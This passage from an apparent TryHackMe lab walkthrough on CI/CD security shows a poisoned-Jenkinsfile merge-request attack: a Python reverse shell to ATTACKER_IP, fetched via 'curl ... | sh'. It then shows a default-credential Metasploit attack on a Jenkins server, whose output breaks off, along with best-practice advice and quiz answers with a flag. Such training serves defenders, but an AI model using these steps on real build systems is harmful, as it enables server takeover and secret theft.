<p>We have the ability to decide what actions can start the build process. Normally, by default, a commit of new code to the source will start the pipeline. But we do have the ability to provide a much more granular configuration. For example, we can decide that only commits to specific branches, such as main, should start the pipeline. This configuration means that we can, with a lot more peace of mind, allow developers to make direct commits to other branches. As long as we limit who has the ability to either directly commit to the main branch or approve merge requests for it, we can limit the attack surface of our pipeline.</p>
<p>However, this might run us into the issue where those merge requests break in the pipeline, causing us to perform multiple merges just to fix the issue, which can be tedious. Therefore, there may be a use case to have the build process already start on other branches or when new merge requests are made to indicate whether the merge request would break our pipeline. If we choose to go down this path, we must understand that our attack surface has grown since multiple actions could start the build process. Nothing to worry about just yet, but we must ensure that these actions cannot be performed simply by anyone!</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="who-can-start-the-build-process">Who can start the build process<a href="#who-can-start-the-build-process" class="hash-link" aria-label="Direct link to Who can start the build process" title="Direct link to Who can start the build process" translate="no">​</a></h4>
<p>Once we decide which actions can start the build process, we need to narrow down who can perform these actions. As mentioned before, the pipeline only executes when code is merged to the main branch; this can be a very small list of users who have the ability to approve these merges. The question becomes more complicated if we allow builds to kick off from other actions. Based on the actions (and branches) that can start the build, we will have to ask who can start it and add them to the list, thereby growing the attack surface. For example, if we allow builds to start on merge requests themselves, we have to ensure that the attacker cannot make a merge request or that the merge build will occur in a segregated environment.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="where-will-the-build-occur">Where will the build occur<a href="#where-will-the-build-occur" class="hash-link" aria-label="Direct link to Where will the build occur" title="Direct link to Where will the build occur" translate="no">​</a></h4>
<p>Lastly, we need to decide where the build will occur. We don&#x27;t have to simply rely on a single build agent to perform all of our builds. In the above example, if we want developers to run builds on other branches, we can just simply register a new build agent that will run a build in a different environment than the build agent of the main branch. Based on our answers to the previous two questions, we may need to ensure we secure where the build will execute. If we allow multiple actions to start the build, we probably want to ensure that the same build agent is not used for all of these actions, as they have different degrees of sensitivity.</p>
<p>Now that we understand the three questions we must answer, let&#x27;s explore a very interesting but common toxic combination!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="exploiting-a-merge-build">Exploiting a Merge Build<a href="#exploiting-a-merge-build" class="hash-link" aria-label="Direct link to Exploiting a Merge Build" title="Direct link to Exploiting a Merge Build" translate="no">​</a></h3>
<p>A common toxic combination is called On-Merge builds. Let&#x27;s take a look at the README left in Ash Android&#x27;s repo (<a href="http://gitlab.tryhackme.loc/ash/Merge-Test" target="_blank" rel="noopener noreferrer" class="">http://gitlab.tryhackme.loc/ash/Merge-Test</a>):</p>
<p><img decoding="async" loading="lazy" alt="README file" src="/TryHackMe-CN/en/assets/images/image_20251141-104148-412ae193388bd06021ff51b78fb5f550.png" width="1199" height="107" class="img_ev3q"></p>
<p>It seems like Ash is getting tired of users making merge requests to his code, only for it to break his pipelines! To combat this, he has enabled on-merge builds. This means that a build will be executed to test the merge code as soon as a merge request is made. This is a very common configuration. Certain CI/CD software, such as Jenkins, enables this by default! The issue, however, is that this could lead to a compromise. Let&#x27;s see how to leverage this to compromise a build agent and some secrets!</p>
<p>Reviewing the source code, we see that Ash uses a Jenkinsfile. This is a CI/CD script that will be executed by Jenkins through a webhook. Effectively, when certain actions are performed, such as a merge request is opened, or code is pushed to a branch, Gitlab will notify Jenkins of the change through a webhook. Jenkins would then pull the source code and execute the steps listed in the Jenkinsfile before providing feedback to Gitlab on the outcome of the build.</p>
<p>However, this is also what creates the issue. If a merge request is going to be built and any user can modify both the source code and the CI/CD Jenkinsfile, it means that users can cause the build agent to build malicious code. To perform this process, we will first need to fork Ash&#x27;s repo. Navigate to the repo and press the Fork option:</p>
<p><img decoding="async" loading="lazy" alt="img" src="/TryHackMe-CN/en/assets/images/image_20251142-104208-3fe7015a124273f8af46bda334c840e3.png" width="1017" height="120" class="img_ev3q"></p>
<p>Forking will create a copy of the project. Select your namespace, mark the project as Private, and select Fork project:</p>
<p><img decoding="async" loading="lazy" alt="fork project button" src="/TryHackMe-CN/en/assets/images/image_20251142-104223-190328c50816126435da5db24c4f11f9.png" width="759" height="608" class="img_ev3q"></p>
<p>While there are multiple ways in which the merge build can be exploited, we will focus on the simplest method, which is to alter the Jenkinsfile. CI/CD pipelines are often just code execution as a feature, and we can leverage this by updating the Jenkinsfile to simply execute a shell for us! There are many ways to do this; if you feel comfortable, you can play around alone. We will follow a slower approach to ensure we get feedback from the Jenkins server as the build executes. To do this, we will first create a simple reverse shell file:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">shell.sh</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/python3 </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;ATTACKER_IP&quot;,8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></span></code></pre></div></div>
<p>Make sure to modify ATTACKER_IP to be your VPN or AttackBox IP. You can now host this file with a simple Python webserver using <code>python3 -m http.server 8080</code> and we can create a listener using <code>nc -lvp 8081</code>. Click on the Jenkinsfile, then Edit, and replace your Jenkinsfile with the following code:</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Jenkinsfile</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pipeline {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    agent any</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    stages {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       stage(&#x27;build&#x27;) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          steps {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              sh &#x27;&#x27;&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    curl http://ATTACKER_IP:8080/shell.sh | sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                &#x27;&#x27;&#x27;                 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              }             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       }       </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre></div></div>
<p>Once you have made the edit, commit the changes. To have Jenkins execute our now malicious Jenkinsfile, we need to create a merge request:</p>
<p><img decoding="async" loading="lazy" alt="merge request" src="/TryHackMe-CN/en/assets/images/image_20251144-104402-7196c593287bef97eaa56f5d7158d25f.png" width="1000" height="93" class="img_ev3q"></p>
<p>Create the merge request, add a description, and click Create. If you completed all the steps in a couple of seconds, you should see a call be made to your web server to download the shell and, shortly after, a new shell connection on the terminal!</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@AttackBox:~$ </span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-lvp</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8081</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Listening on </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0 </span><span class="token number" style="color:#36acaa">8081</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connection received on jenkins.tryhackme.loc </span><span class="token number" style="color:#36acaa">55994</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/bin/sh: </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">: can&#x27;t access </span><span class="token function" style="color:#d73a49">tty</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> job control turned off</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ </span><span class="token function" style="color:#d73a49">whoami</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ubuntu</span><br></span></code></pre></div></div>
<p><strong>Note: If you made a mistake somewhere in the process, you will have to submit a new merge request in order to get your shell. However, it has to be a completely brand new merge request in order for the webhook to trigger. As such, the easiest option is to completely remove your forked-repo and start again. To do this, navigate to your forked-repo, then go to Settings -&gt; Advanced -&gt; Delete Project. Once deleted, you can fork the repo again and start over.</strong></p>
<p>Protecting the build process</p>
<p>Protecting the build process is key to ensuring vulnerabilities are avoided at the start of the code lifecycle. An insecure build can enable living-off-the-land attacks, supply chain attacks and a lot of trouble that is difficult to detect later in the pipeline. Here are some best practices to follow, which knit together what has been discussed in the previous tasks:</p>
<ol>
<li class=""><strong>Isolation and Containerisation</strong>: Run builds in isolated containers to prevent interference and maintain consistency.</li>
<li class=""><strong>Least Privilege</strong>: Grant minimal permissions to CI/CD tools, restricting unnecessary access to sensitive resources.</li>
<li class=""><strong>Secret Management</strong>: Use CI/CD tools&#x27; secret management features to store and inject sensitive data securely.</li>
<li class=""><strong>Immutable Artifacts</strong>: Store build artifacts in a secure registry to prevent tampering and enable easy auditing.</li>
<li class=""><strong>Dependency Scanning</strong>: Integrate dependency scanning to identify and address vulnerabilities in third-party libraries.</li>
<li class=""><strong>Pipeline as Code</strong>: Define CI/CD pipelines as code, version-controlled alongside the source code.</li>
<li class=""><strong>Regular Updates</strong>: Keep CI/CD tools and dependencies up to date to address known vulnerabilities.</li>
<li class=""><strong>Logging and Monitoring</strong>: Monitor build logs for unusual activities and integrate them with security monitoring systems.</li>
</ol>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Where should you store artefacts to prevent tampering? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">secure registry</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What mechanism should you always use to store and inject sensitive data? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">secret management</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What attack can malicious actors perform to inject malicious code in the build process? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">dependency confusion</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Authenticate to Mother and follow the process to claim Flag 1. What is Flag 1? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{7753f7e9-6543-4914-90ad-7153609831c3}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-7-securing-the-build-server">Task 7 Securing the Build Server<a href="#task-7-securing-the-build-server" class="hash-link" aria-label="Direct link to Task 7 Securing the Build Server" title="Direct link to Task 7 Securing the Build Server" translate="no">​</a></h2>
<p>Our build process has now been protected. The next point of attack is the build server itself! If an attacker can gain access or control of our build server, this places them in quite a privileged position to compromise both the pipeline and the build.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="build-server-basics">Build Server Basics<a href="#build-server-basics" class="hash-link" aria-label="Direct link to Build Server Basics" title="Direct link to Build Server Basics" translate="no">​</a></h3>
<p>Before diving into the attack, let&#x27;s discuss basic build server security. The simplest point to start is with access. Even in modern times, a common attack against build infrastructure is to guess credentials and gain access. Whenever you see a Jenkins server out in the wild, you would be surprised how many times <code>jenkins:jenkins</code> would do the trick!</p>
<p>To secure our build server, we want to restrict access to it. You would often find that multiple members have access to the same build server. In these cases, we need to apply granular access to ensure that a compromise of one user would not lead to the compromise of all builds. Furthermore, we want to restrict the likelihood of a user being compromised by using multi-factor authentication.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="exposed-build-server">Exposed Build Server<a href="#exposed-build-server" class="hash-link" aria-label="Direct link to Exposed Build Server" title="Direct link to Exposed Build Server" translate="no">​</a></h3>
<p>Let&#x27;s take a look at the Jenkins build server in the network at <a href="http://jenkins.tryhackme.loc:8080/" target="_blank" rel="noopener noreferrer" class="">http://jenkins.tryhackme.loc:8080/</a>. You may have to first make another update to your <code>/etc/hosts</code> file with the IP of the machine shown in your network diagram. You should see the following screen:</p>
<p><img decoding="async" loading="lazy" alt="Jenkins login screen" src="/TryHackMe-CN/en/assets/images/image_20251106-110635-8855d6608f51af7b55a8d38b89dc4135.png" width="406" height="436" class="img_ev3q"></p>
<p>Let&#x27;s try our luck with <code>jenkins:jenkins</code> and we should be authenticated!</p>
<p><img decoding="async" loading="lazy" alt="authentication successful screen" src="/TryHackMe-CN/en/assets/images/image_20251106-110650-a1d076d073251ba7689d22528f8e0b8f.png" width="651" height="735" class="img_ev3q"></p>
<p>In this task, we will take a look at using some of the MSF modules to attack the Jenkins build server. On the AttackBox or your Kali VM, start Metasploit in the terminal using <code>msfconsole</code>. We will make use of the jenkins_script_console module from MSF:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> use exploit/multi/http/jenkins_script_console</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">multi/http/jenkins_script_console</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Module options </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">exploit/multi/http/jenkins_script_console</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   Name       Current Setting  Required  Description</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   ----       ---------------  --------  -----------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   API_TOKEN                   no        The API token </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> the specified username</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   PASSWORD                    no        The password </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> the specified username</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   Proxies                     no        A proxy chain of </span><span class="token function" style="color:#d73a49">format</span><span class="token plain"> type:host:port</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">,type:host:port</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   RHOSTS                      </span><span class="token function" style="color:#d73a49">yes</span><span class="token plain">       The target host</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                         .html</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   RPORT      </span><span class="token number" style="color:#36acaa">80</span><span class="token plain">               </span><span class="token function" style="color:#d73a49">yes</span><span class="token plain">       The target port </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">TCP</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   SSL        </span><span class="token boolean" style="color:#36acaa">false</span><span class="token plain">            no        Negotiate SSL/TLS </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> outgoing connections</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   SSLCert                     no        Path to a custom SSL certificate </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">default is randomly generated</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   TARGETURI  /jenkins/        </span><span class="token function" style="color:#d73a49">yes</span><span class="token plain">       The path to the Jenkins-CI application</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   URIPATH                     no        The URI to use </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> this exploit </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">default is random</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   USERNAME                    no        The username to authenticate as</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   VHOST                       no        HTTP server virtual </span><span class="token function" style="color:#d73a49">host</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   Name     Current Setting  Required  Description</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   ----     ---------------  --------  -----------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   SRVHOST  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0          </span><span class="token function" style="color:#d73a49">yes</span><span class="token plain">       The </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">host</span><span class="token plain"> or network interface to listen on. This must be an address on the </span><span class="token builtin class-name">local</span><span class="token plain"> machine or </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                       .0.0.0 to listen on all addresses.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   SRVPORT  </span><span class="token number" style="color:#36acaa">8080</span><span class="token plain">             </span><span class="token function" style="color:#d73a49">yes</span><span class="token plain">       The </span><span class="token builtin class-name">local</span><span class="token plain"> port to listen on.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload options </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">windows/meterpreter/reverse_tcp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   Name   Current Setting  Required  Description</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   ----   ---------------  --------  -----------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   LPORT  </span><span class="token number" style="color:#36acaa">4444</span><span class="token plain">             </span><span class="token function" style="color:#d73a49">yes</span><span class="token plain">       The listen port</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   RHOST                   no        The target address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Exploit target:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   Id  Name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   --  ----</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">   Windows</span><br></span></code></pre></div></div>
<p>Configure your module with the correct values and execute for a shell:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">multi/http/jenkins_script_console</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">set</span><span class="token plain"> target </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">target </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">multi/http/jenkins_script_console</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">set</span><span class="token plain"> payload linux/x64/meterpreter/bind_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> linux/x64/meterpreter/bind_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">multi/http/jenkins_script_console</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">set</span><span class="token plain"> password jenkins</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">password </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> jenkins</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">multi/http/jenkins_script_console</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">set</span><span class="token plain"> username jenkins</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">username </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> jenkins</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">multi/http/jenkins_script_console</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">set</span><span class="token plain"> RHOST jenkins.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RHOST </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> jenkins.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">multi/http/jenkins_script_console</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">set</span><span class="token plain"> targeturi /</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">targeturi </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> /</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">multi/http/jenkins_script_console</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">set</span><span class="token plain"> rport </span><span class="token number" style="color:#36acaa">8080</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rport </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8080</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">multi/http/jenkins_script_console</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Checking access to the script console</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Logging in</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Using CSRF token: </span><span class="token string" style="color:#e3116c">&#x27;887729f7a718bb81c8f00bff0df12b4bfb479ccd9cf91582f48107c457cb7d2e&#x27;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Jenkins-Crumb style v2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">52.50</span><span class="token plain">.36.84:8080 - Sending Linux stager</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Command Stager progress - </span><span class="token number" style="color:#36acaa">100.00</span><span class="token plain">% </span><span class="token keyword" style="color:#00009f">done</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">751</span><span class="token plain">/751 bytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Started </span><span class="token builtin class-name">bind</span><span class="token plain"> TCP 